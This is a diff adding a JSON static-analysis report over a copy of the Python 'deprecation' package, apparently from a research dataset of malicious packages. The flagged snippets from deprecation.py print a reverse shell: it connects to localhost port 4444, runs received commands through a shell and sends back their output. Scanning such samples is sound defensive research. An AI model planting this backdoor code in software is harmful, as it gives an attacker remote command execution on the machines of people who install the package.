@@ -1,0 +1,267 @@
+{
+  "errors": [],
+  "generated_at": "2024-10-03T03:52:19Z",
+  "metrics": {
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py": {
+      "CONFIDENCE.HIGH": 1.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 5.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 5.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 1.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 195,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/docs/conf.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 1.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 1.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 35,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/docs/sample.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 0.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 0.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 56,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/example.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 0.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 0.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 8,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/setup.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 4.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 4.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 48,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/tests/__init__.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 0.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 0.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 0,
+      "nosec": 0
+    },
+    "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/tests/test_deprecation.py": {
+      "CONFIDENCE.HIGH": 0.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 0.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 0.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 0.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 217,
+      "nosec": 0
+    },
+    "_totals": {
+      "CONFIDENCE.HIGH": 1.0,
+      "CONFIDENCE.LOW": 0.0,
+      "CONFIDENCE.MEDIUM": 10.0,
+      "CONFIDENCE.UNDEFINED": 0.0,
+      "SEVERITY.HIGH": 5.0,
+      "SEVERITY.LOW": 0.0,
+      "SEVERITY.MEDIUM": 6.0,
+      "SEVERITY.UNDEFINED": 0.0,
+      "loc": 559,
+      "nosec": 0
+    }
+  },
+  "results": [
+    {
+      "code": "34 import subprocess\n35 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n36 s.connect((\"localhost\", 4444))\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "HIGH",
+      "issue_severity": "MEDIUM",
+      "issue_text": "socket.socket",
+      "line_number": 35,
+      "line_range": [
+        35
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes",
+      "test_id": "B304",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "35 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n36 s.connect((\"localhost\", 4444))\n37 while True:\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "HIGH",
+      "issue_text": "socket.socket.connect",
+      "line_number": 36,
+      "line_range": [
+        36
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html",
+      "test_id": "B804",
+      "test_name": "connect"
+    },
+    {
+      "code": "37 while True:\n38     command = s.recv(1024).decode()\n39     if 'terminate' in command:\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "HIGH",
+      "issue_text": "socket.socket.recv",
+      "line_number": 38,
+      "line_range": [
+        38
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html",
+      "test_id": "B809",
+      "test_name": "recv"
+    },
+    {
+      "code": "39     if 'terminate' in command:\n40         s.close()\n41         break\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "HIGH",
+      "issue_text": "socket.socket.close",
+      "line_number": 40,
+      "line_range": [
+        40
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b807_close.html",
+      "test_id": "B807",
+      "test_name": "close"
+    },
+    {
+      "code": "43         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n44         s.send(CMD.stdout.read())\n45         s.send(CMD.stderr.read())\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "HIGH",
+      "issue_text": "socket.socket.send",
+      "line_number": 44,
+      "line_range": [
+        44
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b805_send.html",
+      "test_id": "B805",
+      "test_name": "send"
+    },
+    {
+      "code": "44         s.send(CMD.stdout.read())\n45         s.send(CMD.stderr.read())\n46 \n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/deprecation.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "HIGH",
+      "issue_text": "socket.socket.send",
+      "line_number": 45,
+      "line_range": [
+        45
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b805_send.html",
+      "test_id": "B805",
+      "test_name": "send"
+    },
+    {
+      "code": "35 extensions = ['sphinx.ext.autodoc', 'sphinx.ext.intersphinx']\n36 intersphinx_mapping = {'python': ('https://docs.python.org/dev', None)}\n37 \n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/docs/conf.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "MEDIUM",
+      "issue_text": "url_found",
+      "line_number": 36,
+      "line_range": [
+        36
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
+      "test_id": "B824",
+      "test_name": "url_found"
+    },
+    {
+      "code": "28       license=\"Apache 2\",\n29       url=\"http://deprecation.readthedocs.io/\",\n30       author=AUTHOR,\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "MEDIUM",
+      "issue_text": "url_found",
+      "line_number": 29,
+      "line_range": [
+        29
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
+      "test_id": "B824",
+      "test_name": "url_found"
+    },
+    {
+      "code": "54       project_urls={\n55           \"Documentation\": \"http://deprecation.readthedocs.io/en/latest/\",\n56           \"Source\": \"https://github.com/briancurtin/deprecation\",\n57           \"Bug Tracker\": \"https://github.com/briancurtin/deprecation/issues\"},\n58       )\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "MEDIUM",
+      "issue_text": "url_found",
+      "line_number": 55,
+      "line_range": [
+        54,
+        55,
+        56,
+        57
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
+      "test_id": "B824",
+      "test_name": "url_found"
+    },
+    {
+      "code": "55           \"Documentation\": \"http://deprecation.readthedocs.io/en/latest/\",\n56           \"Source\": \"https://github.com/briancurtin/deprecation\",\n57           \"Bug Tracker\": \"https://github.com/briancurtin/deprecation/issues\"},\n58       )\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "MEDIUM",
+      "issue_text": "url_found",
+      "line_number": 56,
+      "line_range": [
+        54,
+        55,
+        56,
+        57
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
+      "test_id": "B824",
+      "test_name": "url_found"
+    },
+    {
+      "code": "56           \"Source\": \"https://github.com/briancurtin/deprecation\",\n57           \"Bug Tracker\": \"https://github.com/briancurtin/deprecation/issues\"},\n58       )\n",
+      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/deprecation/setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_severity": "MEDIUM",
+      "issue_text": "url_found",
+      "line_number": 57,
+      "line_range": [
+        54,
+        55,
+        56,
+        57
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html",
+      "test_id": "B824",
+      "test_name": "url_found"
+    }
+  ]
+}
